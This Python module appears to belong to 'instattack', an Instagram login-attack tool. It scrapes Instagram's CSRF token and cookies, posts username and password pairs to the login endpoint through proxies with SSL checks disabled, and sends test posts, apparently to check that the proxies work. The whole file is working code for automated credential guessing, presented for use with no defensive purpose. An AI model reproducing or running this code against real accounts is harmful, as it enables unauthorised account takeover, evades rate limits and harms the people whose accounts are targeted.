import re

from instattack.config import settings


class client:

    @classmethod
    def post(cls, session, url, proxy, headers=None, data=None):
        return session.post(
            url,
            headers=headers,
            data=data,
            ssl=False,
            proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
        )

    @classmethod
    async def get_instagram_token(cls, session):
        """
        Sends a basic request to the INSTAGRAM home URL in order to parse the
        response and get the cookies and token.
        """
        async with session.get(settings.INSTAGRAM_URL) as response:
            text = await response.text()
            token = re.search(r'(?<="csrf_token":")\w+', text).group(0)

        return token, response.cookies

    @classmethod
    def instagram_post(cls, session, username, password, proxy, token):

        data = {
            settings.INSTAGRAM_USERNAME_FIELD: username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }
        headers = settings.HEADERS(token)

        return cls.post(
            session=session,
            url=settings.INSTAGRAM_LOGIN_URL,
            proxy=proxy,
            headers=headers,
            data=data
        )

    @classmethod
    def train_post(cls, session, proxy):

        data = {
            'test_field_1': 'test_value_1',
            'test_field_2': 'test_value_2'
        }
        headers = settings.HEADERS()

        return cls.post(
            session=session,
            url=settings.TEST_POST_URL,
            proxy=proxy,
            headers=headers,
            data=data
        )
